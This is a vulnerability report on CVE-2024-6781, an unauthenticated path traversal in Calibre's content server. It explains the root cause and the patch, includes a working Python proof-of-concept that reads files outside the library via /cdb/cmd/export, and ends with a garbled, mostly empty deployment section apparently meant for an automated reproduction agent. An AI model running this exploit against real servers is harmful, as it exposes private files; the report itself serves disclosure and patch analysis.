"# CVE-2024-6781 Detailed Report\n\n## Summary\nCVE-2024-6781 is a high-severity vulnerability classified as CWE-22, which pertains to improper limitation of a pathname to a restricted directory, commonly known as a path traversal vulnerability. This vulnerability affects Calibre versions up to and including 7.14.0. It allows unauthenticated attackers to exploit the content server feature of Calibre to achieve arbitrary file read access, potentially exposing sensitive files on the server.\n\n## Root Cause of the Vulnerability\nThe root cause of the vulnerability lies in the implementation of the `cmd_export.py` module, specifically within the `implementation()` function. The function is invoked by the content server's router (`cdb.py`) based on the incoming HTTP request. The critical flaw occurs because user-controlled arguments (`*args`) are passed directly to the `db.copy_extra_file_to()` function without any input sanitization.\n\nIn the vulnerable code, the `implementation()` function processes the action 'extra_file' and retrieves the `book_id`, `relpath`, and `dest` from the user-supplied arguments. The `db.copy_extra_file_to()` function then constructs a file path using these arguments, which allows an attacker to manipulate the `relpath` to traverse directories and access arbitrary files on the server.\n\nThe patch introduced in the commit modifies the `copy_extra_file_to()` function to include a check that ensures the resolved file path (`extra_file_path`) starts with the `full_book_path`. If it does not, a `FileNotFoundError` is raised, effectively mitigating the path traversal vulnerability.\n\n## Exploit Details\nTo exploit this vulnerability, an unauthenticated attacker can send a specially crafted POST request to the `/cdb/cmd/export` endpoint of the Calibre content server. The attacker can manipulate the `relpath` parameter to traverse directories and read arbitrary files from the server.\n\n### Example Exploit Overview\n1. The attacker sets the target URL of the Calibre content server.\n2. The attacker sends a POST request to the `/cdb/cmd/export` endpoint with a JSON payload that includes the action 'extra_file', a valid `book_id`, and a crafted `relpath` that points to a sensitive file outside the intended directory.\n\n### Proof-of-Concept Code\nThe following is a proof-of-concept (PoC) script that demonstrates the exploitation of the vulnerability:\n\n```python\n#! /usr/bin/env python3\n# PoC for: CVE-2024-6781\n# Description: Unauthenticated arbitrary file read in calibre <= 7.14.0\n# Written by: Amos Ng (@LFlare)\nimport json\nimport sys\nimport requests\n\n_target = \"http://localhost:8080\" # SET ME\n_book_id = 1 # ensure book_id exists\n\ndef exploit(path):\n    r = requests.post(\n        f\"{_target}/cdb/cmd/export\",\n        headers={\"Content-Type\": \"application/json\"},\n        json=[\"extra_file\", _book_id, path, \"\"],\n    )\n    try:\n        print(r.json()[\"result\"])\n    except Exception:\n        print(r.text)\n\nif __name__ == \"__main__\":\n    exploit(\"..\\\\..\\\\..\\\\Calibre Settings\\\\gui.json\")\n```\n\n## Environment Setup Requirements\n- Port: 8080\n- Target Endpoint: /cdb/cmd/export\n- Explicit Configuration: None explicitly mentioned, but the default configuration of Calibre's content server has basic authentication disabled.\n\nThis report highlights the critical nature of the vulnerability and the necessary steps to reproduce and exploit it, along with the provided PoC code for demonstration purposes. The patch effectively addresses the vulnerability by enforcing stricter path validation.\n\n## ðŸš€ DEPLOYMENT STRATEGY (USE THIS - DO NOT GUESS!)\n\n**Repository URL**: https://github.com/kovidgoyal/calibre\n**Platform**: N/A\n**Language**: None\n**Build Tool**: None\n\n### Build Commands:\n```bash\n\n```\n\n### Start Commands:\n```bash\n\n```\n\n### Deployment Notes:\nä»Ž GitHub æºç éƒ¨ç½²ã€‚è¯­è¨€: æœªçŸ¥, æž„å»ºå·¥å…·: æœªçŸ¥\n\nâš ï¸ **CRITICAL INSTRUCTIONS**:\n1. DO NOT try to find Docker images or guess repository URLs\n2. USE THE REPOSITORY URL PROVIDED ABOVE\n3. Clone from the specified repository and follow build/start commands\n4. If build commands fail, analyze error and adapt (but keep using the same repo)\n"